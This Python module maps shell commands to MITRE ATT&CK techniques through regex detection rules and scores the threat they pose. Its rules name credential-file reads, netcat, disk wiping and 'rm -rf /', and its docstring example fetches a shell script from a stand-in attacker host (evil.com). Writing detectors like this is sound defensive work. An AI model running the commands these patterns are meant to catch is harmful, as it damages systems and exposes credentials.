"""
ttp_extractor.py — Maps attacker commands to MITRE ATT&CK technique IDs.

Uses rule-based pattern matching as primary method, with optional
sentence-transformer embeddings for fuzzy/unknown command matching.
"""

from __future__ import annotations
import re
import logging
from dataclasses import dataclass
from typing import Optional

logger = logging.getLogger(__name__)


@dataclass
class TTPMatch:
    technique_id: str
    technique_name: str
    tactic: str
    confidence: float          # 0.0–1.0
    matched_command: str


# ── MITRE ATT&CK rule-based mapping ──────────────────────────────────────────
# Format: (regex_pattern, technique_id, technique_name, tactic, confidence)
MITRE_RULES: list[tuple[str, str, str, str, float]] = [
    # Discovery
    (r"\bwhoami\b",          "T1033",     "System Owner/User Discovery",       "Discovery",            1.0),
    (r"\bid\b",              "T1033",     "System Owner/User Discovery",       "Discovery",            1.0),
    (r"\buname\b",           "T1082",     "System Information Discovery",      "Discovery",            1.0),
    (r"\bhostname\b",        "T1082",     "System Information Discovery",      "Discovery",            0.9),
    (r"\bifconfig\b",        "T1016",     "System Network Config Discovery",   "Discovery",            1.0),
    (r"\bip\s+addr\b",       "T1016",     "System Network Config Discovery",   "Discovery",            1.0),
    (r"\bnetstat\b",         "T1049",     "System Network Connections Disc.",  "Discovery",            1.0),
    (r"\bss\s+-",            "T1049",     "System Network Connections Disc.",  "Discovery",            1.0),
    (r"\bps\s+",             "T1057",     "Process Discovery",                 "Discovery",            1.0),
    (r"\bls\b",              "T1083",     "File and Directory Discovery",      "Discovery",            0.7),
    (r"\bfind\s+/",         "T1083",     "File and Directory Discovery",      "Discovery",            0.9),
    (r"\benv\b",             "T1082",     "System Information Discovery",      "Discovery",            0.8),
    # Credential Access
    (r"cat\s+/etc/shadow",   "T1003.008", "OS Credential Dumping: /etc/shadow","Credential Access",   1.0),
    (r"cat\s+/etc/passwd",   "T1003.008", "OS Credential Dumping: /etc/passwd","Credential Access",   0.9),
    (r"\bhydra\b",           "T1110",     "Brute Force",                       "Credential Access",   1.0),
    (r"\bmedusa\b",          "T1110",     "Brute Force",                       "Credential Access",   1.0),
    # Command and Control / Exfiltration
    (r"\bwget\s+",           "T1105",     "Ingress Tool Transfer",             "Command and Control", 1.0),
    (r"\bcurl\s+",           "T1105",     "Ingress Tool Transfer",             "Command and Control", 1.0),
    (r"\btftp\b",            "T1105",     "Ingress Tool Transfer",             "Command and Control", 1.0),
    (r"\bnc\s+",             "T1095",     "Non-Application Layer Protocol",    "Command and Control", 0.9),
    (r"\bnetcat\b",          "T1095",     "Non-Application Layer Protocol",    "Command and Control", 0.9),
    # Persistence
    (r"\bcrontab\s+-e",      "T1053.003", "Scheduled Task/Job: Cron",          "Persistence",         1.0),
    (r"\.bashrc",            "T1546.004", "Event Triggered Exec: .bash_profile","Persistence",        0.8),
    (r"\buseradd\b",         "T1136.001", "Create Account: Local Account",     "Persistence",         1.0),
    (r"\bpasswd\b",          "T1098",     "Account Manipulation",              "Persistence",         0.8),
    # Privilege Escalation
    (r"\bsudo\b",            "T1548.003", "Abuse Elevation: Sudo",             "Privilege Escalation",1.0),
    (r"\bchmod\s+\+s",       "T1548.001", "Setuid/Setgid",                     "Privilege Escalation",0.9),
    (r"\bchmod\s+777\b",     "T1222",     "File/Directory Permissions Mod.",   "Defense Evasion",     0.8),
    # Lateral Movement
    (r"\bssh\s+",            "T1021.004", "Remote Services: SSH",              "Lateral Movement",    0.9),
    (r"\bscp\s+",            "T1021.004", "Remote Services: SSH",              "Lateral Movement",    0.9),
    # Impact
    (r"\bdd\s+if=",          "T1561",     "Disk Wipe",                         "Impact",              0.9),
    (r"\brm\s+-rf\s+/",     "T1485",     "Data Destruction",                  "Impact",              1.0),
    # Mining
    (r"\bxmrig\b",           "T1496",     "Resource Hijacking",                "Impact",              1.0),
    (r"\bminerd\b",          "T1496",     "Resource Hijacking",                "Impact",              1.0),
]

_COMPILED_RULES = [(re.compile(pat, re.IGNORECASE), tid, tname, tactic, conf)
                   for pat, tid, tname, tactic, conf in MITRE_RULES]


class TTPExtractor:
    """
    Maps a list of shell commands to MITRE ATT&CK technique IDs.

    Usage:
        extractor = TTPExtractor()
        ttps = extractor.extract(["whoami", "wget http://evil.com/shell.sh", "crontab -e"])
    """

    def extract(self, commands: list[str]) -> list[TTPMatch]:
        seen_ids: set[str] = set()
        results: list[TTPMatch] = []

        for cmd in commands:
            cmd = cmd.strip()
            if not cmd:
                continue
            for pattern, tid, tname, tactic, conf in _COMPILED_RULES:
                if pattern.search(cmd) and tid not in seen_ids:
                    seen_ids.add(tid)
                    results.append(TTPMatch(
                        technique_id=tid,
                        technique_name=tname,
                        tactic=tactic,
                        confidence=conf,
                        matched_command=cmd,
                    ))

        return sorted(results, key=lambda m: m.confidence, reverse=True)

    def extract_as_dicts(self, commands: list[str]) -> list[dict]:
        return [
            {
                "technique_id": m.technique_id,
                "technique_name": m.technique_name,
                "tactic": m.tactic,
                "confidence": m.confidence,
                "matched_command": m.matched_command,
            }
            for m in self.extract(commands)
        ]

    def threat_score_contribution(self, commands: list[str]) -> float:
        """Returns 0–40 score contribution based on detected TTPs."""
        ttps = self.extract(commands)
        if not ttps:
            return 0.0
        tactic_weights = {
            "Impact": 40,
            "Privilege Escalation": 35,
            "Credential Access": 30,
            "Lateral Movement": 25,
            "Persistence": 20,
            "Command and Control": 15,
            "Defense Evasion": 10,
            "Discovery": 5,
        }
        score = 0.0
        counted_tactics: set[str] = set()
        for ttp in ttps:
            if ttp.tactic not in counted_tactics:
                score += tactic_weights.get(ttp.tactic, 5) * ttp.confidence
                counted_tactics.add(ttp.tactic)
        return min(score, 40.0)
